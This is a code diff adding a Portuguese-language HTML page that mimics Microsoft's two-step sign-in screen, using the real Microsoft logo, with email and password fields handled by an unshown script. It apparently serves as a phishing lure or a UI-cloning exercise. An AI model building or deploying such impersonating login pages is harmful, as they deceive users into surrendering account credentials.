@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Landing Page Microsoft</title>
+</head>
+<body>
+    <div class="login-container" type="login-box">
+        <div class="logindiv">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="100" height="25">
+            <h2>Entrar</h2>
+           <p id="error" class="error-message" style="display: none;">Insira um endereço de email, número de telefone ou nome Skype válidos.</p>
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="Email, telefone ou Skype"><br/>
+                <a>Não tem uma conta? Crie uma!</a><br/><br/>
+                <a>Entrar com uma chave de segurança </a>
+        </div>
+        <button type="button" id="toggleButton">Próximo</button>
+           </form>
+    </div>
+
+    <div class="login-container" type="password-box" style="display: none;" >
+        <div class="passworddiv">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="100" height="25">
+            <div class="linhadelabel">
+                <svg class="botao_retorno" type="button" id="backButton" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+                </svg>
+                <label id="usernamePlaceholder"></label>
+            </div>
+            <h2>Insira a senha</h2>
+            <form id="passwordForm">
+                <input type="password" id="password" name="password" placeholder="Senha">
+                <a>Esqueceu sua senha? </a><br/><br/>
+        </div>
+        <button type="submit">Entrar</button>
+        </form>
+    </div>
+
+    <script src="script1.2.js"></script>
+</body>
+</html>
